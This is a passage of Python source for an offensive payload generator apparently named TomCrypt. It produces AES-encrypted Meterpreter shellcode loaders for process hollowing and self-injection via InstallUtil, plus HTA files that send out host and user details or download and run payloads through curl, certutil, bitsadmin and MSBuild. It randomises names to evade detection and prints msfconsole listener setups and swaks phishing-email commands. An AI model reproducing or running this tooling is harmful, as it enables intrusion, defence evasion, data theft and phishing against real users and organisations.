        help="LHOST: IP or interface name (e.g. tun0).")
    lnx.add_argument("-P", "--lport", type=int, default=443, metavar="PORT",
        help="LPORT (default: 443).")
    lnx.add_argument("-p", "--payload",
        default="linux/x64/meterpreter/reverse_tcp",
        metavar="PAYLOAD", help="msfvenom payload string (default: linux/x64/meterpreter/reverse_tcp).")
    lnx.add_argument("-a", "--arch", choices=["x64", "x86"], default=None,
        metavar="ARCH", help="Architecture (x64 or x86). Inferred from -p if omitted. Must match payload.")
    lnx.add_argument("-o", "--output", metavar="PATH",
        help="Output path for the ELF binary (default: ./loader).")

    return p



# ══════════════════════════════════════════════════════════════════════════════
# Builders - InstallUtil C# (used by hta cradle)
# ══════════════════════════════════════════════════════════════════════════════

def build_cs_installutil_x64(result: EncryptResult, cfg: Config) -> str:
    """InstallUtil Installer-subclass loader — x64 process hollowing.

    class inherits Installer, [RunInstaller(true)] attribute, Uninstall() entry.
    InstallUtil.exe /U invokes Uninstall() outside CLM.
    Compile: mcs /platform:x64 -r:System.Configuration.Install.dll
    """
    cls          = rand_id()
    fn           = rand_id()
    e, k, v, sc = rand_id(), rand_id(), rand_id(), rand_id()
    junk         = rand_junk()

    return f"""\
// =====================================================
// TomCrypt v{__version__} - InstallUtil Loader (x64)
// {junk}
// =====================================================
// Payload : {cfg.payload}
// LHOST   : {cfg.lhost}   LPORT : {cfg.lport}
// Target  : {cfg.target}
// Encrypt : AES-256-CBC   Bypass: InstallUtil /U
// =====================================================
using System;
using System.Collections;
using System.Runtime.InteropServices;
using System.Configuration.Install;

[System.ComponentModel.RunInstaller(true)]
public class {cls} : Installer
{{
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr LoadLibrary(string n);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptAcquireContext(out IntPtr hProv, string c, string p, uint t, uint f);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptImportKey(IntPtr hProv, byte[] d, uint l, IntPtr pub, uint f, out IntPtr hKey);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptSetKeyParam(IntPtr hKey, uint p, byte[] d, uint f);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool fin, uint f, byte[] d, ref uint l);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptDestroyKey(IntPtr h);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptReleaseContext(IntPtr h, uint f);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {{
        public int    cb;
        public string lpReserved, lpDesktop, lpTitle;
        public uint   dwX, dwY, dwXSize, dwYSize,
                      dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short  wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }}
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {{
        public IntPtr hProcess, hThread;
        public uint   dwProcessId, dwThreadId;
    }}
    [StructLayout(LayoutKind.Explicit, Size = 1232)]
    struct CONTEXT
    {{
        [FieldOffset(0x30)] public uint  ContextFlags;
        [FieldOffset(0xF8)] public ulong Rip;
    }}

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    delegate bool CreateProcessW_t(string app, string cmd, IntPtr pa, IntPtr ta,
        bool inherit, uint flags, IntPtr env, string dir,
        [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate IntPtr VirtualAllocEx_t(IntPtr h, IntPtr addr, uint size, uint type, uint prot);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool WriteProcessMemory_t(IntPtr h, IntPtr base_, byte[] buf, uint size, out IntPtr written);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool VirtualProtectEx_t(IntPtr h, IntPtr addr, uint size, uint prot, out uint old);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool GetThreadContext_t(IntPtr h, [In, Out] ref CONTEXT ctx);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool SetThreadContext_t(IntPtr h, [In] ref CONTEXT ctx);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate uint ResumeThread_t(IntPtr h);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool CloseHandle_t(IntPtr h);

    static T R<T>(string mod, string name) where T : class
    {{
        IntPtr h = GetModuleHandle(mod);
        if (h == IntPtr.Zero) h = LoadLibrary(mod);
        IntPtr p = GetProcAddress(h, name);
        return p == IntPtr.Zero ? null : (T)(object)Marshal.GetDelegateForFunctionPointer(p, typeof(T));
    }}

{_cs_decrypt_func(fn, e, k, v)}

    public static void Main(string[] args) {{ }}

    public override void Uninstall(IDictionary savedState)
    {{
        try
        {{
            {cs_byte_array(e, result.ciphertext)}
            {cs_byte_array(k, result.key)}
            {cs_byte_array(v, result.iv)}
            byte[] {sc} = {fn}({e}, {k}, {v});

            var pCP  = R<CreateProcessW_t>     ("kernel32.dll", "CreateProcessW");
            var pVAX = R<VirtualAllocEx_t>     ("kernel32.dll", "VirtualAllocEx");
            var pWPM = R<WriteProcessMemory_t> ("kernel32.dll", "WriteProcessMemory");
            var pVPX = R<VirtualProtectEx_t>   ("kernel32.dll", "VirtualProtectEx");
            var pGTC = R<GetThreadContext_t>   ("kernel32.dll", "GetThreadContext");
            var pSTC = R<SetThreadContext_t>   ("kernel32.dll", "SetThreadContext");
            var pRT  = R<ResumeThread_t>       ("kernel32.dll", "ResumeThread");
            var pCH  = R<CloseHandle_t>        ("kernel32.dll", "CloseHandle");
            if (pCP == null || pVAX == null || pWPM == null || pVPX == null ||
                pGTC == null || pSTC == null || pRT == null || pCH == null) return;

            var si = new STARTUPINFO();
            si.cb  = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;

            if (!pCP(@"{cfg.target}", null, IntPtr.Zero, IntPtr.Zero,
                     false, 0x4, IntPtr.Zero, null, ref si, out pi)) return;

            IntPtr remote = pVAX(pi.hProcess, IntPtr.Zero, (uint){sc}.Length, 0x3000, 0x04);
            if (remote == IntPtr.Zero) {{ pCH(pi.hProcess); pCH(pi.hThread); return; }}

            IntPtr written;
            pWPM(pi.hProcess, remote, {sc}, (uint){sc}.Length, out written);

            uint old;
            pVPX(pi.hProcess, remote, (uint){sc}.Length, 0x20, out old);

            var ctx = new CONTEXT();
            ctx.ContextFlags = 0x100001;
            pGTC(pi.hThread, ref ctx);
            ctx.Rip = (ulong)remote.ToInt64();
            pSTC(pi.hThread, ref ctx);

            pRT(pi.hThread);
            pCH(pi.hProcess);
            pCH(pi.hThread);
        }}
        catch {{ }}
    }}
}}
"""


def build_cs_installutil_x86(result: EncryptResult, cfg: Config) -> str:
    """InstallUtil Installer-subclass loader — x86 self-injection fallback."""
    cls          = rand_id()
    fn           = rand_id()
    e, k, v, sc = rand_id(), rand_id(), rand_id(), rand_id()
    junk         = rand_junk()

    return f"""\
// =====================================================
// TomCrypt v{__version__} - InstallUtil Loader (x86)
// {junk}
// =====================================================
// Payload : {cfg.payload}
// LHOST   : {cfg.lhost}   LPORT : {cfg.lport}
// Encrypt : AES-256-CBC   Bypass: InstallUtil /U
// Note    : x86 - self-injecting (hollow not supported on x86)
// =====================================================
using System;
using System.Collections;
using System.Runtime.InteropServices;
using System.Configuration.Install;

[System.ComponentModel.RunInstaller(true)]
public class {cls} : Installer
{{
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr LoadLibrary(string n);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptAcquireContext(out IntPtr hProv, string c, string p, uint t, uint f);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptImportKey(IntPtr hProv, byte[] d, uint l, IntPtr pub, uint f, out IntPtr hKey);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptSetKeyParam(IntPtr hKey, uint p, byte[] d, uint f);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool fin, uint f, byte[] d, ref uint l);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptDestroyKey(IntPtr h);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CryptReleaseContext(IntPtr h, uint f);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate IntPtr VirtualAlloc_t(IntPtr addr, uint size, uint type, uint prot);
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    delegate bool VirtualProtect_t(IntPtr addr, uint size, uint prot, out uint old);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr CreateThread_t(IntPtr ta, uint stack, IntPtr start, IntPtr param, uint flags, out IntPtr tid);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate uint WaitForSingleObject_t(IntPtr h, uint ms);

    static T R<T>(string mod, string name) where T : class
    {{
        IntPtr h = GetModuleHandle(mod);
        if (h == IntPtr.Zero) h = LoadLibrary(mod);
        IntPtr p = GetProcAddress(h, name);
        return p == IntPtr.Zero ? null : (T)(object)Marshal.GetDelegateForFunctionPointer(p, typeof(T));
    }}

{_cs_decrypt_func(fn, e, k, v)}

    public static void Main(string[] args) {{ }}

    public override void Uninstall(IDictionary savedState)
    {{
        try
        {{
            {cs_byte_array(e, result.ciphertext)}
            {cs_byte_array(k, result.key)}
            {cs_byte_array(v, result.iv)}
            byte[] {sc} = {fn}({e}, {k}, {v});

            var pVA   = R<VirtualAlloc_t>       ("kernel32.dll", "VirtualAlloc");
            var pVP   = R<VirtualProtect_t>     ("kernel32.dll", "VirtualProtect");
            var pCT   = R<CreateThread_t>       ("kernel32.dll", "CreateThread");
            var pWFSO = R<WaitForSingleObject_t>("kernel32.dll", "WaitForSingleObject");
            if (pVA == null || pVP == null || pCT == null || pWFSO == null) return;

            IntPtr addr = pVA(IntPtr.Zero, (uint){sc}.Length, 0x3000, 0x04);
            if (addr == IntPtr.Zero) return;
            Marshal.Copy({sc}, 0, addr, {sc}.Length);

            uint old;
            pVP(addr, (uint){sc}.Length, 0x20, out old);

            IntPtr tid;
            IntPtr ht = pCT(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);
            if (ht == IntPtr.Zero) return;
            pWFSO(ht, 0xFFFFFFFF);
        }}
        catch {{ }}
    }}
}}
"""


# ══════════════════════════════════════════════════════════════════════════════
# Builders - HTA
# ══════════════════════════════════════════════════════════════════════════════

def build_hta_enum(lhost: str, port: int = 80) -> str:
    """JScript HTA enumeration payload.

    Collects host info via WScript.Shell/Network and WMI, then POSTs it back.
    Tries curl first (Win10 1803+), falls back to WinHttp.WinHttpRequest.5.1.
    All variable names are randomised per run to vary the file hash.
    self.close() fires immediately after the send so the HTA window disappears.
    """
    url = f"http://{lhost}" if port == 80 else f"http://{lhost}:{port}"

    # JScript variable names — randomised so each generated file is distinct
    v_shell    = rand_id()
    v_env      = rand_id()
    v_net      = rand_id()
    v_osarch   = rand_id()
    v_wow64    = rand_id()
    v_parch    = rand_id()
    v_curproc  = rand_id()
    v_wmi      = rand_id()
    v_procs    = rand_id()
    v_en       = rand_id()
    v_p        = rand_id()
    v_info     = rand_id()
    v_http     = rand_id()
    v_err      = rand_id()
    v_rc       = rand_id()
    v_tmp      = rand_id()
    v_fso      = rand_id()
    v_file     = rand_id()
    junk       = rand_junk()

    return f"""\
<html>
<head>
<script language="JScript">
// TomCrypt v{__version__} - HTA Enum | {junk}
// LHOST: {lhost}  PORT: {port}
var {v_shell} = new ActiveXObject("WScript.Shell");
var {v_env}   = {v_shell}.Environment("PROCESS");
var {v_net}   = new ActiveXObject("WScript.Network");

// Detect OS and process architecture
var {v_osarch} = {v_env}("PROCESSOR_ARCHITECTURE");
var {v_wow64}  = {v_env}("PROCESSOR_ARCHITEW6432");
var {v_parch}  = "x86";
if ({v_osarch} === "AMD64" || {v_osarch} === "x64") {{
    {v_parch} = ({v_wow64} && {v_wow64} !== "") ? "x86" : "x64";
}}

// Find the process hosting this HTA via WMI CommandLine scan
var {v_curproc} = "unknown";
try {{
    var {v_wmi}   = GetObject("winmgmts:\\\\\\\\.\\\\root\\\\cimv2");
    var {v_procs} = {v_wmi}.ExecQuery("SELECT Name, ProcessId, CommandLine FROM Win32_Process");
    var {v_en}    = new Enumerator({v_procs});
    for (; !{v_en}.atEnd(); {v_en}.moveNext()) {{
        var {v_p} = {v_en}.item();
        if ({v_p}.CommandLine && {v_p}.CommandLine.toLowerCase().indexOf(".hta") !== -1) {{
            {v_curproc} = {v_p}.Name + " (PID " + {v_p}.ProcessId + ")";
            break;
        }}
    }}
}} catch ({v_err}) {{
    {v_curproc} = "error: " + {v_err}.message;
}}

// Collect
var {v_info} = "=== HTA ENUM ===\\n";
{v_info} += "Computer        : " + {v_net}.ComputerName + "\\n";
{v_info} += "User            : " + {v_net}.UserName + "\\n";
{v_info} += "Domain          : " + {v_net}.UserDomain + "\\n";
{v_info} += "OS Architecture : " + {v_osarch} + "\\n";
{v_info} += "Process Arch    : " + {v_parch} + "\\n";
{v_info} += "Current Process : " + {v_curproc} + "\\n";
{v_info} += "Processor       : " + {v_env}("PROCESSOR_IDENTIFIER") + "\\n";
{v_info} += "OS              : " + {v_env}("OS") + "\\n";
{v_info} += "Time            : " + new Date().toString() + "\\n";

// Send — curl first (Win10 1803+), WinHttp fallback
// Write to temp file so newlines survive the command line
var {v_tmp} = {v_shell}.ExpandEnvironmentStrings("%TEMP%") + "\\\\" + Math.random().toString(36).substr(2) + ".txt";
var {v_fso} = new ActiveXObject("Scripting.FileSystemObject");
var {v_file} = {v_fso}.CreateTextFile({v_tmp}, true);
{v_file}.Write({v_info});
{v_file}.Close();
var {v_rc} = {v_shell}.Run("cmd.exe /c curl -s -X POST --data-binary @" + {v_tmp} + " {url} && del /f /q " + {v_tmp}, 0, true);
if ({v_rc} !== 0) {{
    var {v_http} = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    {v_http}.SetTimeouts(2000, 2000, 4000, 4000);
    {v_http}.Open("POST", "{url}", false);
    {v_http}.SetRequestHeader("Content-Type", "text/plain");
    {v_http}.SetRequestHeader("Connection", "close");
    {v_http}.Send({v_info});
    {v_http} = null;
    try {{ {v_fso}.DeleteFile({v_tmp}, true); }} catch (e) {{}}
}}

self.close();
</script>
</head>
<body></body>
</html>
"""


def build_hta_ping(lhost: str, port: int = 80, token: Optional[str] = None) -> str:
    """Minimal HTA ping — one WinHttp POST with a unique token, then close.

    Designed for maximum reliability on initial phishing in lab environments.
    """
    if token is None:
        token = rand_junk(12)
    url = f"http://{lhost}" if port == 80 else f"http://{lhost}:{port}"
    v_http = rand_id()
    junk = rand_junk()

    return f"""\
<html>
<head>
<script language="JScript">
// TomCrypt ping | {junk}
var {v_http} = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
{v_http}.SetTimeouts(2000, 2000, 4000, 4000);
{v_http}.Open("POST", "{url}", false);
{v_http}.SetRequestHeader("Content-Type", "text/plain");
{v_http}.Send("ping={token}");
{v_http} = null;
self.close();
</script>
</head>
<body></body>
</html>
"""


def build_hta_cradle(lhost: str, serve_port: int, filename: str,
                     drop_path: str, exe_name: str, arch: str = "x64") -> str:
    """HTA delivery cradle for the InstallUtil CLM-bypass chain.

    Download chain (first success wins, checked via bWaitOnReturn return code):
      1. curl            — Win10 1803+, fastest
      2. certutil -urlcache -f — available on all Windows
      3. bitsadmin /transfer  — legacy BITS fallback

    Once the encoded file lands, certutil -decode unpacks it and
    InstallUtil.exe /U executes the C# Uninstall() override outside CLM.

    Using separate synchronous Run() calls (intWindowStyle=0, bWaitOnReturn=true)
    lets us test each return code and fall through cleanly. The final InstallUtil
    Run() is async (bWaitOnReturn=false) so self.close() fires without blocking
    on the meterpreter callback.

    Windows paths are double-backslash-escaped so JScript string parsing
    does not silently drop backslashes (\\U, \\P etc. are not valid JS escapes).
    """
    url         = f"http://{lhost}" if serve_port == 80 else f"http://{lhost}:{serve_port}"
    enc_url     = f"{url}/{filename}"
    drop_enc    = drop_path.rstrip("\\") + "\\" + filename
    drop_exe    = drop_path.rstrip("\\") + "\\" + exe_name
    fw          = "Framework64" if arch == "x64" else "Framework"
    installutil = f"C:\\Windows\\Microsoft.NET\\{fw}\\v4.0.30319\\InstallUtil.exe"

    # Escape backslashes for embedding in JScript string literals.
    # A raw path like C:\Users\Public becomes C:\\Users\\Public in the
    # generated source; JScript then decodes \\  ->  \ at runtime.
    drop_enc_js = drop_enc.replace("\\", "\\\\")
    drop_exe_js = drop_exe.replace("\\", "\\\\")
    iu_js       = installutil.replace("\\", "\\\\")

    v_shell = rand_id()
    v_dl    = rand_id()
    v_dec   = rand_id()
    junk    = rand_junk()

    return f"""\
<html>
<head>
<script language="JScript">
// TomCrypt v{__version__} - HTA InstallUtil Cradle | {junk}
// LHOST: {lhost}  Payload: {enc_url}
var {v_shell} = new ActiveXObject("WScript.Shell");
// Step 1 - download encoded payload (curl -> certutil -> bitsadmin)
var {v_dl} = {v_shell}.Run("cmd.exe /c curl -s -o {drop_enc_js} {enc_url} 2>nul", 0, true);
if ({v_dl} !== 0) {{ {v_dl} = {v_shell}.Run("cmd.exe /c certutil -urlcache -f {enc_url} {drop_enc_js} 2>nul", 0, true); }}
if ({v_dl} !== 0) {{ {v_dl} = {v_shell}.Run("cmd.exe /c bitsadmin /transfer tc {enc_url} {drop_enc_js}", 0, true); }}
// Step 2 - certutil decode -> InstallUtil execute
if ({v_dl} === 0) {{
    var {v_dec} = {v_shell}.Run("cmd.exe /c certutil -decode {drop_enc_js} {drop_exe_js} 2>nul", 0, true);
    if ({v_dec} === 0) {{ {v_shell}.Run("cmd.exe /c {iu_js} /logfile= /LogToConsole=false /U {drop_exe_js}", 0, false); }}
}}
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
"""


def cmd_hta_cradle(args: argparse.Namespace) -> None:
    """Full pipeline: msfvenom → AES encrypt → InstallUtil C# → mcs compile →
    certutil encode (Python) → delivery HTA.  No manual steps on Kali."""
    lhost = resolve_lhost(args.lhost)
    cfg   = Config(
        payload = args.payload,
        lhost   = lhost,
        lport   = args.lport,
        target  = args.target,
        output  = Path(args.output) if args.output else None,
    )

    arch = resolve_arch(cfg.payload, getattr(args, "arch", None))
    if arch == "x86":
        print(warn("x86 payload — hollow not supported, falling back to self-injection."))

    print(ok(f"TomCrypt v{__version__} [hta installutil]"))
    print(info(f"Payload  : {cfg.payload}"))
    print(info(f"Arch     : {arch}"))
    print(info(f"LHOST    : {lhost}"))
    print(info(f"LPORT    : {args.lport}"))
    print(info(f"Drop to  : {args.drop_path}"))
    print(info("Encrypt  : AES-256-CBC   Bypass: InstallUtil.exe /U"))

    # Generate + encrypt shellcode
    shellcode = run_msfvenom(cfg, arch)
    print(info(f"Shellcode: {len(shellcode):,} B"))
    result = encrypt_aes256(shellcode)
    print(info(f"Encrypted: {result.original_len:,} B -> {len(result.ciphertext):,} B"))

    default_stem = "payload"
    stem    = cfg.output.stem if cfg.output else default_stem
    basedir = cfg.output.parent if cfg.output else Path.cwd()

    # C# InstallUtil loader
    cs_code = (build_cs_installutil_x64(result, cfg) if arch == "x64"
               else build_cs_installutil_x86(result, cfg))
    cs_path = basedir / f"{stem}.cs"
    cs_path.write_text(cs_code, encoding="utf-8")
    print(ok(f"Source   : {cs_path}"))

    # Compile (requires mono-mcs and System.Configuration.Install.dll in GAC)
    exe_path = compile_cs(cs_path, arch, refs=["System.Configuration.Install.dll"])

    # certutil encode — pure Python, no Windows dependency
    enc_data = certutil_encode(exe_path.read_bytes())
    txt_path = basedir / f"{stem}.txt"
    txt_path.write_text(enc_data, encoding="ascii")
    print(ok(f"Encoded  : {txt_path}  ({txt_path.stat().st_size:,} B)"))

    # Delivery HTA
    hta_code = build_hta_cradle(lhost, args.serve_port,
                                 txt_path.name, args.drop_path, exe_path.name, arch)
    hta_path = basedir / f"{stem}_delivery.hta"
    hta_path.write_text(hta_code, encoding="utf-8")
    print(ok(f"HTA      : {hta_path}"))

    fw          = "Framework64" if arch == "x64" else "Framework"
    installutil = f"C:\\Windows\\Microsoft.NET\\{fw}\\v4.0.30319\\InstallUtil.exe"
    listener    = (
        f"msfconsole -q -x 'use multi/handler; "
        f"set payload {cfg.payload}; "
        f"set LHOST {lhost}; "
        f"set LPORT {args.lport}; "
        f"set ExitOnSession false; run -j'"
    )
    serve_url = (f"http://{lhost}" if args.serve_port == 80
                 else f"http://{lhost}:{args.serve_port}")

    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Start listener:"))
    print(hint(f"  {listener}"))
    print()
    print(info("Step 2 - Serve the encoded payload:"))
    print(hint(f"  python3 -m http.server {args.serve_port}   (in {basedir})"))
    print()
    print(info("Step 3 - Deliver the HTA:"))
    print(hint(f"  mshta.exe {serve_url}/{hta_path.name}"))
    print(hint(f"  swaks --body 'Click here {serve_url}/{hta_path.name}' \\"))
    print(hint(f"    --add-header 'MIME-Version: 1.0' \\"))
    print(hint(f"    --add-header 'Content-Type: text/html' \\"))
    print(hint(f"    --header 'Subject: Issues with mail' \\"))
    print(hint(f"    -t VICTIM@TARGET -f will@tricky.com --server TARGET_MAIL_IP"))
    print()
    print(info("Execution chain on target (nothing built on Kali at runtime):"))
    print(hint(f"  mshta.exe -> cmd.exe -> curl/certutil/bitsadmin -> certutil -decode -> {installutil} /U"))
    print(_SEP)

def build_hta_msbuild_cradle(lhost: str, serve_port: int,
                              xml_filename: str, drop_path: str, arch: str = "x64") -> str:
    """Single shell.Run with && chain — mirrors the known-working HTA pattern exactly.
    curl downloads the XML, && ensures MSBuild only fires on success.
    No bWaitOnReturn, no fallback chain — fire and forget.
    """
    url      = f"http://{lhost}" if serve_port == 80 else f"http://{lhost}:{serve_port}"
    xml_url  = f"{url}/{xml_filename}"
    drop_xml = drop_path.rstrip("\\") + "\\" + xml_filename
    fw       = "Framework64" if arch == "x64" else "Framework"
    msbuild  = f"C:\\Windows\\Microsoft.NET\\{fw}\\v4.0.30319\\MSBuild.exe"

    # Escape backslashes for JScript string literals
    drop_js = drop_xml.replace("\\", "\\\\")
    msb_js  = msbuild.replace("\\", "\\\\")

    v_shell = rand_id()
    v_res   = rand_id()
    junk    = rand_junk()

    return f"""<html>
<head>
<script language="JScript">
// TomCrypt v{__version__} - HTA MSBuild Cradle | {junk}
var {v_shell} = new ActiveXObject("WScript.Shell");
var {v_res}   = {v_shell}.Run("cmd.exe /c curl -s -o {drop_js} {xml_url} && {msb_js} {drop_js}");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
"""


def cmd_hta_msbuild(args: argparse.Namespace) -> None:
    """Generate the MSBuild XML payload and matching delivery HTA in one step.

    No mcs or certutil required — tomcrypt writes the XML, the HTA downloads
    it and hands it to MSBuild.exe on the target.
    """
    lhost = resolve_lhost(args.lhost)
    cfg   = Config(
        payload = args.payload,
        lhost   = lhost,
        lport   = args.lport,
        target  = args.target,
        output  = Path(args.output) if args.output else None,
    )

    arch = resolve_arch(cfg.payload, getattr(args, "arch", None))
    if arch == "x86":
        print(warn("x86 payload — hollow not supported, falling back to self-injection."))

    print(ok(f"TomCrypt v{__version__} [hta msbuild]"))
    print(info(f"Payload  : {cfg.payload}"))
    print(info(f"Arch     : {arch}"))
    print(info(f"LHOST    : {lhost}"))
    print(info(f"LPORT    : {args.lport}"))
    print(info(f"Drop to  : {args.drop_path}"))
    print(info("Encrypt  : AES-256-CBC   Delivery: MSBuild.exe LOLBIN"))
    print(info("Compile  : none required on Kali"))

    shellcode = run_msfvenom(cfg, arch)
    print(info(f"Shellcode: {len(shellcode):,} B"))
    result = encrypt_aes256(shellcode)
    print(info(f"Encrypted: {result.original_len:,} B -> {len(result.ciphertext):,} B"))

    default_stem = "payload"
    stem    = cfg.output.stem if cfg.output else default_stem
    basedir = cfg.output.parent if cfg.output else Path.cwd()

    # XML — the actual payload, no mcs needed
    xml_code = (build_xml_hollow_x64(result, cfg) if arch == "x64"
                else build_xml_simple_x86(result, cfg))
    xml_path = basedir / f"{stem}.xml"
    xml_path.write_text(xml_code, encoding="utf-8")
    print(ok(f"XML      : {xml_path}"))

    # HTA — the delivery vehicle
    hta_code = build_hta_msbuild_cradle(lhost, args.serve_port,
                                         xml_path.name, args.drop_path, arch)
    hta_path = basedir / f"{stem}_delivery.hta"
    hta_path.write_text(hta_code, encoding="utf-8")
    print(ok(f"HTA      : {hta_path}"))

    listener = (
        f"msfconsole -q -x 'use multi/handler; "
        f"set payload {cfg.payload}; "
        f"set LHOST {lhost}; "
        f"set LPORT {args.lport}; "
        f"set ExitOnSession false; run -j'"
    )

    serve_url = f"http://{lhost}" if args.serve_port == 80 else f"http://{lhost}:{args.serve_port}"
    fw_msb    = "Framework64" if arch == "x64" else "Framework"
    msb       = f"C:\\Windows\\Microsoft.NET\\{fw_msb}\\v4.0.30319\\MSBuild.exe"

    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Start listener:"))
    print(hint(f"  {listener}"))
    print()
    print(info("Step 2 - Serve the XML:"))
    print(hint(f"  python3 -m http.server {args.serve_port}   (in {basedir})"))
    print()
    print(info("Step 3 - Deliver the HTA:"))
    print(hint(f"  mshta.exe {serve_url}/{hta_path.name}"))
    print(hint(f"  swaks --body 'Click here {serve_url}/{hta_path.name}' \\"))
    print(hint(f"    --add-header 'MIME-Version: 1.0' \\"))
    print(hint(f"    --add-header 'Content-Type: text/html' \\"))
    print(hint(f"    --header 'Subject: Issues with mail' \\"))
    print(hint(f"    -t VICTIM@TARGET -f will@tricky.com --server TARGET_MAIL_IP"))
    print()
    print(info("Execution chain on target (no compilation, no certutil on Kali):"))
    print(hint(f"  mshta.exe -> cmd.exe -> curl/certutil/bitsadmin -> {msb} {args.drop_path}\\{xml_path.name}"))
    print(hint(f"  MSBuild compiles the inline task, decrypts AES shellcode, injects into target"))
    print(_SEP)


def cmd_hta_enum(args: argparse.Namespace) -> None:
    lhost = resolve_lhost(args.lhost)
    port  = args.recv_port

    hta  = build_hta_enum(lhost, port)
    stem = Path(args.output).stem if args.output else "HostEnum"
    bdir = Path(args.output).parent if args.output else Path.cwd()
    out  = bdir / f"{stem}.hta"
    out.write_text(hta, encoding="utf-8")

    print(ok(f"TomCrypt v{__version__} [hta enum]"))
    print(info(f"LHOST    : {lhost}"))
    print(info(f"Receiver : port {port}"))
    print(ok(f"Output   : {out}"))
    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Start receiver:"))
    print(hint(f"  nc -lvnp {port}"))
    print()
    print(info("Step 2 - Deliver the HTA (pick one):"))
    print(hint(f"  Email attachment  : attach {out.name}, victim double-clicks"))
    print(hint(f"  SMB share         : \\\\{lhost}\\share\\{out.name}  (mshta.exe opens it directly)"))
    print(hint(f"  Browser download  : host with python3 -m http.server {port}, send link"))
    print(hint(f"  Shell one-liner   : mshta.exe http://{lhost}/{out.name}"))
    print()
    print(info("Output includes: hostname, user, domain, OS arch, process arch,"))
    print(info("  hosting process name+PID, processor ID, OS string, timestamp."))
    print(_SEP)


def cmd_hta_ping(args: argparse.Namespace) -> None:
    lhost = resolve_lhost(args.lhost)
    port  = args.recv_port
    token = args.token or rand_junk(12)

    hta  = build_hta_ping(lhost, port, token)
    stem = Path(args.output).stem if args.output else "Ping"
    bdir = Path(args.output).parent if args.output else Path.cwd()
    out  = bdir / f"{stem}.hta"
    out.write_text(hta, encoding="utf-8")

    print(ok(f"TomCrypt v{__version__} [hta ping]"))
    print(info(f"LHOST    : {lhost}"))
    print(info(f"Receiver : port {port}"))
    print(info(f"Token    : {token}"))
    print(ok(f"Output   : {out}"))
    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Start receiver:"))
    print(hint(f"  nc -lvnp {port}"))
    print(hint(f"  Look for: ping={token}"))
    print()
    print(info("Step 2 - Deliver the HTA (pick one):"))
    print(hint(f"  Email attachment  : attach {out.name}, victim double-clicks"))
    print(hint(f"  SMB share         : \\\\{lhost}\\share\\{out.name}"))
    print(hint(f"  Browser / one-liner : mshta.exe http://{lhost}/{out.name}"))
    print(_SEP)


# ══════════════════════════════════════════════════════════════════════════════
# Builders - VBA
# ══════════════════════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════════════════════
# RTI helpers
# ══════════════════════════════════════════════════════════════════════════════


def rti_template_url(lhost: str, serve_port: int, dotm_name: str) -> str:
    """Absolute URL Word will OPTIONS, then HEAD, then GET."""
    if serve_port == 80:
        return f"http://{lhost}/{dotm_name}"
    return f"http://{lhost}:{serve_port}/{dotm_name}"


def _resolve_rti_payload(payload, arch):
    """Return (payload, arch). arch is Office bitness the shellcode must match."""
    if payload is None and arch is None:
        arch = "x64"
    if payload is None:
